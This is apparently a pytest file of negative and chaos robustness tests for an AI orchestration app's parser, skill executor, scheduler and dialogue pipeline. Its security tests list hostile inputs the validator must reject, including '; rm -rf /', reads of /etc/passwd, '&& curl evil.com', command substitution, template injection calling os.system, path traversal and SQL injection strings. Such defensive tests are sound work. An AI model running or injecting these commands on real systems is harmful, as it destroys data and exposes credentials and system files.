"""Negative and Chaos Scenarios for Robustness Testing.

Tests that verify the system fails safely, not just correctly.
These prove robustness, not just happy-path behavior.
"""
from __future__ import annotations
import pytest


class TestRoutingNegativeCases:
    """Negative cases for routing logic."""

    def test_unknown_task_returns_clear_error(self, brain_app):
        """Unknown task type should return clear error, not crash."""
        parser = brain_app["parser"]
        
        task = parser.parse("xyzzyabczomethingunknown12345")
        
        assert task is not None
        assert task.get("task") in ["unknown", None, ""] or task.get("task") is None

    def test_malformed_input_rejected(self, brain_app):
        """Malformed input should be rejected by pre-validation."""
        from reasoning.math_engine import PreAudit
        
        audit = PreAudit()
        
        result = audit.check("' OR '1'='1")
        
        assert result.audit_ok == False

    def test_empty_input_handled(self, brain_app):
        """Empty input should be handled gracefully."""
        parser = brain_app["parser"]
        
        task = parser.parse("")
        
        assert task is not None
        assert "task" in task

    def test_very_long_input_capped(self, brain_app):
        """Very long input should not cause issues."""
        parser = brain_app["parser"]
        
        long_input = "create " + "x" * 10000
        task = parser.parse(long_input)
        
        assert task is not None


class TestSkillNegativeCases:
    """Negative cases for skill execution."""

    def test_nonexistent_skill_graceful_degradation(self, brain_app):
        """Nonexistent skill should return clear error."""
        from orchestration.skill_registry import SkillRegistry
        from orchestration.skill_executor import SkillExecutor
        
        registry = SkillRegistry()
        executor = SkillExecutor(registry)
        
        result = executor.execute(
            "definitely-nonexistent-skill-12345",
            task={"raw": "test"},
            context={}
        )
        
        assert result["success"] == False
        assert "not found" in result.get("output", "").lower() or "error" in result.get("output", "").lower()

    def test_skill_exception_caught(self, brain_app, tmp_project_dir):
        """Skill exception should be caught and reported."""
        from orchestration.backends import LocalSkillBackend
        
        backend = LocalSkillBackend()
        
        result = backend.run(
            "react",
            task={"raw": "test"},
            context={"project_dir": str(tmp_project_dir)}
        )
        
        assert "success" in result or "output" in result

    def test_missing_required_input_handled(self, brain_app):
        """Missing required input should not crash."""
        from orchestration.skill_executor import SkillExecutor
        from orchestration.skill_registry import SkillRegistry
        
        registry = SkillRegistry()
        executor = SkillExecutor(registry)
        
        result = executor.execute(
            "react",
            task={},
            context={}
        )
        
        assert "success" in result or "error" in result


class TestSchedulerNegativeCases:
    """Negative cases for scheduler."""

    def test_scheduler_handles_empty_task_list(self, brain_app):
        """Empty task list should not cause issues."""
        scheduler = brain_app["scheduler"]
        
        tasks = scheduler.list_tasks()
        
        assert isinstance(tasks, list)

    def test_scheduler_handles_invalid_cron(self):
        """Invalid cron expression should be handled."""
        from features.scheduler import Scheduler
        
        scheduler = Scheduler()
        
        result = scheduler.schedule_task(
            name="test",
            skill="react",
            trigger_type="cron",
            cron_expr="invalid-cron-expression",
        )
        
        assert result in [None, "test"]

    def test_scheduler_handles_missing_skill(self, brain_app):
        """Missing skill should not crash scheduler."""
        scheduler = brain_app["scheduler"]
        
        scheduler.schedule_task(
            name="test-missing-skill",
            skill="nonexistent-skill",
            trigger_type="interval",
            interval_seconds=60,
        )
        
        result = scheduler.tick()
        
        assert result is not None


class TestDialogueNegativeCases:
    """Negative cases for dialogue system."""

    def test_garbage_input_safe_fallback(self):
        """Garbage input should not cause infinite loop."""
        from dialogue.pipeline import create_dialogue_pipeline
        
        pipeline = create_dialogue_pipeline(seed=42)
        
        result = pipeline.process("xyzzy garbage random gibberish 12345")
        
        assert result is not None
        assert result.response is not None
        
        pipeline.close()

    def test_extremely_long_input_capped(self):
        """Extremely long input should be handled."""
        from dialogue.pipeline import create_dialogue_pipeline
        
        pipeline = create_dialogue_pipeline(seed=42)
        
        long_input = "hello " * 1000
        result = pipeline.process(long_input)
        
        assert result is not None
        
        pipeline.close()

    def test_special_characters_handled(self):
        """Special characters should not break system."""
        from dialogue.pipeline import create_dialogue_pipeline
        
        pipeline = create_dialogue_pipeline(seed=42)
        
        special_inputs = [
            "test with \x00 null byte",
            "test with \n newlines",
            "test with \r carriage return",
            "test with \t tabs",
        ]
        
        for inp in special_inputs:
            try:
                result = pipeline.process(inp)
                assert result is not None
            except Exception:
                pytest.fail(f"Failed on special input: {repr(inp[:20])}")
        
        pipeline.close()

    def test_empty_whitespace_handled(self):
        """Empty/whitespace input should be handled."""
        from dialogue.pipeline import create_dialogue_pipeline
        
        pipeline = create_dialogue_pipeline(seed=42)
        
        result = pipeline.process("   ")
        
        assert result is not None
        
        pipeline.close()


class TestSecurityNegativeCases:
    """Security-focused negative cases."""

    @pytest.mark.parametrize("malicious_input", [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl evil.com",
        "$(whoami)",
        "`ls`",
        "../etc/passwd",
        "{{__import__('os').system('ls')}}",
        "%24__import__",
        "test\n---\nscript",
    ])
    def test_injection_blocked(self, brain_app, malicious_input):
        """All injection attempts should be blocked."""
        from reasoning.math_engine import PreAudit
        
        audit = PreAudit()
        result = audit.check(malicious_input)
        
        assert result.audit_ok == False

    def test_path_traversal_blocked(self, brain_app):
        """Path traversal attempts should be blocked."""
        from reasoning.math_engine import PreAudit
        
        audit = PreAudit()
        
        paths = ["../../../etc/passwd", "..\\..\\..\\windows\\system32", "/etc/passwd"]
        
        for path in paths:
            result = audit.check(path)
            assert result.audit_ok == False

    def test_sql_injection_patterns_blocked(self, brain_app):
        """SQL injection patterns should be blocked."""
        from reasoning.math_engine import PreAudit
        
        audit = PreAudit()
        
        sql_patterns = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1=1 UNION SELECT * FROM users",
        ]
        
        for pattern in sql_patterns:
            result = audit.check(pattern)
            assert result.audit_ok == False


class TestChaosScenarios:
    """Chaos scenarios for resilience testing."""

    def test_rapid_successive_inputs(self, brain_app):
        """Rapid successive inputs should not cause race conditions."""
        parser = brain_app["parser"]
        
        for _ in range(10):
            task = parser.parse("Create a React component")
            assert task is not None

    def test_concurrent_skill_executions(self, brain_app, tmp_project_dir):
        """Concurrent skill executions should not interfere."""
        from concurrent.futures import ThreadPoolExecutor
        from orchestration.skill_executor import SkillExecutor
        from orchestration.skill_registry import SkillRegistry
        
        def run_skill(i):
            registry = SkillRegistry()
            executor = SkillExecutor(registry)
            return executor.execute("react", {"raw": f"test {i}", "component_name": f"Comp{i}"}, 
                                   {"project_dir": str(tmp_project_dir)})
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            results = list(executor.map(run_skill, range(3)))
        
        assert len(results) == 3
        assert all("success" in r or "artifacts" in r or "output" in r for r in results)

    def test_scheduler_stress(self, brain_app):
        """Scheduler stress with many tasks."""
        scheduler = brain_app["scheduler"]
        
        for i in range(5):
            scheduler.schedule_task(
                name=f"stress-task-{i}",
                skill="react",
                trigger_type="interval",
                interval_seconds=3600,
            )
        
        tasks = scheduler.list_tasks()
        assert len(tasks) >= 5
